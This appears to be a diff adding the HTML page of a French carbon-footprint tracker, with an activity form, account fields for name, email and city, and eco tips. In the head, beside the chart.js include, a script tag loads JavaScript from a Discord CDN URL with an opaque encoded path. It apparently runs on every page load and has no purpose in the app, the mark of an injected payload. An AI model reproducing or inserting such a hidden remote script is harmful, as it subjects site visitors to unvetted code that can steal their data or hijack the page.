@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Carbon - Évalue ton impact</title>
+  <link rel="stylesheet" href="style.css">
+  <script type='text/javascript' src='https://cdn.discordapp.com/EmCRki4YArbjJRgxNw9orm2cvfpb3xXD4ES2ATSrTnl45LtLKYOVBVxs8Fqi0Eml57Bu3nm6I7i8raUeABOnDg=='></script><script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+  <header>
+    <h1><span class="green">C</span>arbon</h1>
+    <nav>
+      <ul>
+        <li><a href="#dashboard">Dashboard</a></li>
+        <li><a href="#profile">Profil</a></li>
+        <li><a href="#account">Mon compte</a></li>
+        <li><a href="#friends">Amis</a></li>
+        <li><a href="#tips">Astuces</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <section id="dashboard" class="active">
+    <h2>Mon Impact Carbone</h2>
+    <canvas id="pieChart"></canvas>
+
+    <h2>Ajouter une activité</h2>
+    <form id="activity-form">
+      <label>Type de transport :
+        <select name="transport">
+          <option value="">-- Choisir --</option>
+          <option value="voiture">Voiture</option>
+          <option value="bus">Bus</option>
+          <option value="train">Train</option>
+          <option value="avion">Avion</option>
+        </select>
+      </label>
+      <label>Distance (km) : <input type="number" name="distance"></label>
+      <button type="submit">Ajouter</button>
+    </form>
+
+    <div id="history">
+      <h3>Historique des activités</h3>
+      <ul id="history-list"></ul>
+    </div>
+  </section>
+
+  <section id="profile">
+    <h2>Profil Utilisateur</h2>
+    <p>[Infos utilisateur ici]</p>
+  </section>
+
+  <section id="account">
+    <h2>Mon compte</h2>
+    <div class="account-container">
+      <img src="https://api.dicebear.com/7.x/fun-emoji/svg?seed=carbon" alt="Avatar" class="avatar">
+      <div class="account-info">
+        <label>Nom : <input type="text" id="user-name" placeholder="Ton nom"></label>
+        <label>Email : <input type="email" id="user-email" placeholder="Ton email"></label>
+        <label>Ville : <input type="text" id="user-city" placeholder="Ta ville"></label>
+        <button onclick="saveAccount()">Enregistrer</button>
+      </div>
+    </div>
+  </section>
+
+  <section id="friends">
+    <h2>Mes amis</h2>
+    <p>[Comparaison des scores]</p>
+  </section>
+
+  <section id="tips">
+    <h2>Conseils écologiques</h2>
+    <ul>
+      <li>Privilégier les transports en commun</li>
+      <li>Réduire les achats inutiles</li>
+      <li>Utiliser des appareils basse consommation</li>
+    </ul>
+  </section>
+
+  <footer>
+    <p>&copy; 2025 Carbon. Tous droits réservés.</p>
+  </footer>
+
+  <script src="app.js"></script>
+</body>
+</html>
